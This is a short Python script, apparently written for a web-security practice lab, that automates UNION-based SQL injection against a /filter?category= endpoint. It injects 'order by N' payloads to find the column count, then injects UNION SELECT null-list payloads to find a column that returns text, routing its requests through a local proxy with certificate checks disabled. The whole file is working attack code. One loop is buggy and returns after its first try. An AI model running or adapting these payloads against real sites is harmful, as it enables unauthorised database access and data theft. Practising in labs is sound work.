import sys
from time import sleep
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
def sqli_exploit(url):
    uri = "/filter?category=Pets"
    # r = requests.get(url + uri + payload + " --",verify=False,proxies=proxies)
    payload =1
    while True:
        print("still requesting")
        r = requests.get(url + uri + " 'order by %d"% payload + " --",verify=False,proxies=proxies)
        if 'Internal Server Error' in r.text:
            return payload -1
        else:
            payload = payload + 1
            # sleep(10)
def sqli_exploit_string(url,num):
    path = "/filter?category=Lifestyle"
    for i in range(1,num):
        string = "'6TTFnc'"
        payload_list = ['null'] * num
        payload_list[i-1] = string
        sqli_payload = " 'Union select " +",".join(payload_list) + "--"
        print(",".join(payload_list))
        r = requests.get(url+path+sqli_payload,verify=False,proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
        return False
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage %s <url>"% sys.argv[0].strip())
        print("[-] Exampel %s example.com + uri + order by 1 -- "% sys.argv[0].strip())
        sys.exit(-1)
    num = sqli_exploit(url)
    if num:
            print("[+] SQL Injection succesfull and column no is %d "%num)
            print("[+} Figuring out which field contain string  " )
            stringcolumn = sqli_exploit_string(url,num)
            if stringcolumn:
                print("[+] The column that contain string %d"% stringcolumn) 
            else:
                print("[-] column not found")
    else:
        print("[-] SQL Injection failed! try other method")
